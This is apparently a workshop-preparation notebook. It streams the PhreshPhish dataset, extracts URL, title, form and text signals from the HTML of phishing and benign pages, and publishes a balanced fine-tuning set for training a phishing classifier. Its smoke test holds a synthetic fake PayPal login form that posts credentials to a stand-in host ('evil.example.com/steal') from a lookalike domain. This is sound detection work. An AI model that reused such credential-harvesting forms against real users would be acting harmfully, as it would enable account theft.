# Prep 01 — Text Variant Dataset

**Run this once, before the workshop. Output is published to HuggingFace and consumed by attendees.**

## What this notebook does

1. Streams [`phreshphish/phreshphish`](https://huggingface.co/datasets/phreshphish/phreshphish) (36.6 GB Parquet) **without downloading the full dataset** — uses HF Datasets streaming.
2. For each row, extracts a compact text representation from the URL + HTML: title, meta tags, form actions/inputs, visible body text.
3. Filters to samples that fit comfortably in Qwen3-4B's context (target ≤ 3,000 tokens).
4. Stops once we have **1,000 phish + 1,000 benign** samples.
5. Splits 90/10 train/val and pushes to a public HF dataset.

## Where to run

SageMaker Studio JupyterLab space (`ml.m5.xlarge` is plenty) or any host with ≥5 GB scratch. **Do not run this on a laptop with <10 GB free** — even with streaming, HF caches small chunks.

## Output schema (what gets pushed to HF)

JSONL with these fields per row:

```json
{
  "prompt": "You are a phishing detector. ... URL: ... Title: ... Forms: ... Visible text: ...",
  "completion": "phish",
  "label": "phish",
  "target_brand": "paypal",
  "sha256": "..."
}
```

The `prompt` and `completion` columns are exactly what SageMaker SFTTrainer expects.

## 0. Install dependencies

In [ ]:
%pip install -q -r requirements.txt

## 1. Configuration

Set your HuggingFace org and dataset name. You'll need `huggingface-cli login` (or `HF_TOKEN` env var) with **write** access to push.

In [ ]:
HF_REPO_ID = "gt2026workshop/phreshphish-2k"  # text + image variants share this repo via configs
HF_CONFIG_NAME = "text"

TARGET_PER_LABEL = 1000
MAX_TOKENS = 3000   # cap per sample (prompt only); leaves headroom for completion + chat template
MIN_TOKENS = 50     # drop samples that lost all signal during cleaning
VAL_FRACTION = 0.10
RANDOM_SEED = 42

print(f"Will push to: https://huggingface.co/datasets/{HF_REPO_ID}  (config: {HF_CONFIG_NAME})")

## 2. HTML → compact text extractor

PhreshPhish HTML can be **76 MB** per row. We need a robust, fast extractor that pulls the signal a phishing classifier actually uses:

- Title and meta description
- Form `action` URLs and input field names (where credentials would be exfiltrated)
- Visible body text, deduplicated and length-capped

We deliberately **do not** include scripts, styles, base64 images, or comments.

In [ ]:
import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup

_WS = re.compile(r"\s+")

def extract_signals(url: str, html: str, max_chars: int = 12_000) -> str:
    """Compact text representation of a webpage for phishing classification.

    Output is ~1-2K tokens for typical pages, capped at ~3K via max_chars.
    """
    if not html:
        return f"URL: {url}\n(empty page)"

    # Cap raw HTML before parsing — some PhreshPhish pages are 76MB
    html = html[:1_500_000]
    soup = BeautifulSoup(html, "lxml")

    for tag in soup(["script", "style", "noscript", "svg"]):
        tag.decompose()

    parts = []
    parsed = urlparse(url) if url else None
    parts.append(f"URL: {url}")
    if parsed and parsed.hostname:
        parts.append(f"Host: {parsed.hostname}")

    title = soup.title.get_text(strip=True) if soup.title else ""
    if title:
        parts.append(f"Title: {title[:200]}")

    for meta in soup.find_all("meta", limit=10):
        name = meta.get("name") or meta.get("property")
        content = meta.get("content")
        if name and content and name.lower() in {"description", "og:title", "og:description", "keywords"}:
            parts.append(f"Meta {name}: {content[:200]}")

    forms = soup.find_all("form", limit=5)
    if forms:
        form_lines = []
        for f in forms:
            action = f.get("action", "") or "(none)"
            method = f.get("method", "GET")
            inputs = []
            for inp in f.find_all(["input", "select", "textarea"], limit=10):
                t = inp.get("type", inp.name)
                n = inp.get("name", inp.get("id", ""))
                inputs.append(f"{t}:{n}" if n else t)
            form_lines.append(f"  form action={action[:200]} method={method} fields=[{', '.join(inputs)}]")
        parts.append("Forms:\n" + "\n".join(form_lines))

    body = soup.body or soup
    text = body.get_text(" ", strip=True)
    text = _WS.sub(" ", text).strip()
    if text:
        parts.append(f"Visible text: {text}")

    out = "\n".join(parts)
    if len(out) > max_chars:
        out = out[:max_chars] + "…"
    return out

In [ ]:
# Smoke-test the extractor on a tiny synthetic HTML
_demo_html = """
<html><head><title>PayPal - Sign In</title>
<meta name="description" content="PayPal account verification required">
<script>alert('hi')</script></head>
<body><h1>Verify your account</h1>
<form action="https://evil.example.com/steal" method="POST">
<input type="email" name="user"><input type="password" name="pass">
</form>
<p>We detected unusual activity. Please sign in.</p></body></html>
"""
print(extract_signals("https://paypa1-secure.example.com/login", _demo_html))

## 3. Token counter

We use `tiktoken` cl100k as a fast proxy for Qwen3 token counts (Qwen tokenizers aren't exactly the same, but cl100k is close enough for filtering — typically within 10%).

In [ ]:
import tiktoken
_enc = tiktoken.get_encoding("cl100k_base")

def n_tokens(text: str) -> int:
    return len(_enc.encode(text, disallowed_special=()))

## 4. Build the prompt

Single instruction, classification target. Completion is exactly `phish` or `benign` (no extra whitespace, no JSON).

In [ ]:
INSTRUCTION = (
    "You are a phishing-detection classifier. Given a webpage's URL and a compact "
    "summary of its content (title, meta tags, forms, visible text), output exactly "
    "one word: 'phish' if the page is a phishing attempt, 'benign' if it is legitimate."
)

def build_prompt(signals: str) -> str:
    return f"{INSTRUCTION}\n\n---\n{signals}\n---\n\nLabel:"

def label_to_completion(label: str) -> str:
    # PhreshPhish uses 'phish' / 'benign' — keep verbatim
    return label

## 5. Stream PhreshPhish and collect 1k + 1k

We stream the **train** split. We accept a row only if its built prompt is between `MIN_TOKENS` and `MAX_TOKENS`.

Expected runtime: 5–20 minutes depending on which rows pass the filter and your network.

In [ ]:
import random
from datasets import load_dataset
from tqdm.auto import tqdm

random.seed(RANDOM_SEED)

# streaming=True ⇒ no full download; rows fetched on demand
stream = load_dataset("phreshphish/phreshphish", split="train", streaming=True)

buckets = {"phish": [], "benign": []}
skipped = {"too_short": 0, "too_long": 0, "empty_html": 0, "extract_err": 0}
examined = 0

pbar = tqdm(total=2 * TARGET_PER_LABEL, desc="collecting")
for row in stream:
    examined += 1
    label = row.get("label")
    if label not in buckets or len(buckets[label]) >= TARGET_PER_LABEL:
        if all(len(v) >= TARGET_PER_LABEL for v in buckets.values()):
            break
        continue

    html = row.get("html") or ""
    if not html.strip():
        skipped["empty_html"] += 1
        continue

    try:
        signals = extract_signals(row.get("url", ""), html)
    except Exception:
        skipped["extract_err"] += 1
        continue

    prompt = build_prompt(signals)
    n = n_tokens(prompt)
    if n < MIN_TOKENS:
        skipped["too_short"] += 1
        continue
    if n > MAX_TOKENS:
        skipped["too_long"] += 1
        continue

    buckets[label].append({
        "prompt": prompt,
        "completion": label_to_completion(label),
        "label": label,
        "target_brand": row.get("target"),
        "sha256": row.get("sha256"),
        "n_tokens": n,
    })
    pbar.update(1)

    if examined % 500 == 0:
        pbar.set_postfix(examined=examined, **{k: len(v) for k, v in buckets.items()})

pbar.close()
print(f"Examined {examined} rows total.")
print(f"Collected: phish={len(buckets['phish'])}, benign={len(buckets['benign'])}")
print(f"Skipped:   {skipped}")

## 6. Token-length sanity check

Confirm we're well under Qwen3-4B's 32K context window.

In [ ]:
import statistics as stats
all_rows = buckets["phish"] + buckets["benign"]
lengths = [r["n_tokens"] for r in all_rows]
print(f"n samples: {len(all_rows)}")
print(f"token length — min: {min(lengths)}  median: {stats.median(lengths):.0f}  p95: {sorted(lengths)[int(0.95*len(lengths))]}  max: {max(lengths)}")
print(f"target cap: {MAX_TOKENS}")
print(f"Qwen3-4B context: 32768  → headroom: {32768 - max(lengths)} tokens")

## 7. Train/val split

In [ ]:
rng = random.Random(RANDOM_SEED)
rng.shuffle(all_rows)

n_val = int(len(all_rows) * VAL_FRACTION)
val_rows = all_rows[:n_val]
train_rows = all_rows[n_val:]
print(f"train={len(train_rows)}  val={len(val_rows)}")

# Sanity: label balance per split
from collections import Counter
print("train labels:", Counter(r["label"] for r in train_rows))
print("val labels:  ", Counter(r["label"] for r in val_rows))

## 8. Push to HuggingFace Hub

Pushed under config `text` of the shared repo `gt2026workshop/phreshphish-2k`. Each row has only `prompt` + `completion` so attendees can `load_dataset(...)` it cleanly into SageMaker SFT.

In [ ]:
from datasets import Dataset, DatasetDict

def to_sft(rows):
    return Dataset.from_list([{"prompt": r["prompt"], "completion": r["completion"]} for r in rows])

sft = DatasetDict(train=to_sft(train_rows), validation=to_sft(val_rows))
sft

In [ ]:
# Authenticate first if needed:
#   from huggingface_hub import login; login()
# or set HF_TOKEN env var

sft.push_to_hub(HF_REPO_ID, config_name=HF_CONFIG_NAME, private=False)

print(f"Done. Dataset: https://huggingface.co/datasets/{HF_REPO_ID}  (config: {HF_CONFIG_NAME})")

## 9. Also write a JSONL copy locally

SageMaker `DataSet.create()` can take an S3 URI to a JSONL file directly. Useful as a backup path if attendees can't pull from HF.

In [ ]:
import json, pathlib

out_dir = pathlib.Path("./out_text")
out_dir.mkdir(exist_ok=True)

for name, rows in [("train.jsonl", train_rows), ("validation.jsonl", val_rows)]:
    with open(out_dir / name, "w") as f:
        for r in rows:
            f.write(json.dumps({"prompt": r["prompt"], "completion": r["completion"]}) + "\n")
    print(f"wrote {out_dir / name}  ({len(rows)} rows)")